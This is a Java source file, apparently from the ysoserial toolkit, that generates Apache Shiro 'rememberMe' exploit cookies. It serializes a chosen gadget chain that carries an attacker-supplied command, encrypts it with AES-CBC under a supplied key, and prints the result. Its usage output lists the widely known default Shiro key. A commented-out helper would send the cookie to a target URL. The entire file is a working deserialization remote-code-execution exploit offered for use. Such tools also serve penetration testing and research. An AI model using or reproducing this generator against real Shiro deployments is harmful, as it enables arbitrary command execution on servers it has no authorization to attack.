package ysoserial.exploit;

import org.apache.commons.codec.binary.Base64;
import org.apache.shiro.subject.SimplePrincipalCollection;
import ysoserial.Serializer;
import ysoserial.payloads.ObjectPayload;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.security.AlgorithmParameters;

public class Shiro {
    public static void main(String[] args) throws Exception {
        if (args.length == 3) {
            String className = String.format("ysoserial.payloads.%s", args[1]);
            ObjectPayload<Object> gadget = (ObjectPayload<Object>) Class.forName(className).newInstance();
            Object object = gadget.getObject(args[2]);

            byte[] bytes = Serializer.serialize(object);
            String cookie = encrypt(args[0], bytes);
            System.out.println("rememberMe=" + cookie);
        } else if (args.length == 1 ) {
            SimplePrincipalCollection simplePrincipalCollection = new SimplePrincipalCollection();
            byte[] bytes = Serializer.serialize(simplePrincipalCollection);
            String cookie = encrypt(args[0], bytes);
            System.out.println("rememberMe=" + cookie);
        } else {
            System.out.println("Usage: " + Shiro.class.getName() + " <key>");
            System.out.println("Usage: " + Shiro.class.getName() + " <key> <gadget> <command>");
            System.out.print("Top Keys:\n" +
                "kPH+bIxk5D2deZiIxcaaaA==" + "\n"
            );
        }
    }

//    public static void request(String url, String rememberMe) {
//        try {
//            HttpURLConnection connection = (HttpURLConnection)(new URL(url)).openConnection();
//            connection.setRequestMethod("GET");
//            connection.setConnectTimeout(10000);
//            connection.setReadTimeout(10000);
//            connection.setRequestProperty("Cookie", "rememberMe=" + rememberMe);
//            connection.connect();
//            int code = connection.getResponseCode();
//            connection.disconnect();
//        } catch (Exception var3) {
//            var3.printStackTrace();
//        }
//
//    }

    public static String encrypt(String key, byte[] payload) {
        try {
            byte[] raw = Base64.decodeBase64(key);
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            AlgorithmParameters params = cipher.getParameters();
            byte[] ivs = ((IvParameterSpec)params.getParameterSpec(IvParameterSpec.class)).getIV();
            IvParameterSpec iv = new IvParameterSpec(ivs);
            SecretKeySpec keySpec = new SecretKeySpec(raw, "AES");
            cipher.init(1, keySpec, iv);
            byte[] encrypted = cipher.doFinal(payload);
            byte[] result = new byte[ivs.length + encrypted.length];
            System.arraycopy(ivs, 0, result, 0, ivs.length);
            System.arraycopy(encrypted, 0, result, ivs.length, encrypted.length);
            return Base64.encodeBase64String(result);
        } catch (Exception var10) {
            var10.printStackTrace();
            return null;
        }
    }
}
